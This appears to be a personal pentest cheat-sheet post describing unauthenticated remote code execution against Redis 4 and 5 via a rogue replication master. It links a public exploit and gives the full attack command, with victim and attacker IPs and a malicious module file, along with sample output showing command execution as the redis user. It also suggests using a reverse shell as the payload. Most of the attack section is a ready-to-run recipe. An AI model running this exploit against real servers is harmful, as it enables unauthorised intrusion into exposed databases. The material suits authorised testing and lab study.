---
layout: post
title: Redis 4 and 5 Unauthenticated RCE
description: Redis 4 and 5 Unauthenticated RCE
summary: Redis 4 and 5 Unauthenticated RCE
tags: [rce,foothold]
minute: 1
---
# Overview
You can deploy a rougue redis server and make use of its replication capabilities to execute arbritrary commands inside the server.

::NOTE::

Looks like this is for linux only

![](/spindel/assets/Redis%204%20and%205%20Unauthenticated%20RCE/357378FF-379F-4EFA-81F7-4A12EC11EEFC.png)

# Steps
* Download this [exploit](https://github.com/vulhub/redis-rogue-getshell)
* Follow instruction on how to compile `exp.so`
* Run it from attacker machine

```bash
# 10.10.70.254 - victim ip
# 10.11.40.33 - attacker ip
python3 redis-master.py -r 10.10.70.254 -p 6379 -L 10.11.40.33 -P 8888 -f RedisModulesSDK/exp.so -c "id"
```

* Sample output

```
...truncated...


# Clients
connected_clients:1
client_longest_output_list:0
client_biggest_input_buf:0
blocked_clients:0

uid=112(redis) gid=123(redis) groups=123(redis)
```

# Notes
* If you use reverse shell as your command, this may break the redis for some reasons. So you only have 1 chance to do it because next time it would not work.
* This might not work if commands such as `MODULE` is not available on the target redis instance

# References
* https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf
* [Pavel Toporkov - Redis post-exploitation](https://www.youtube.com/watch?v=Jmv-0PnoJ6c)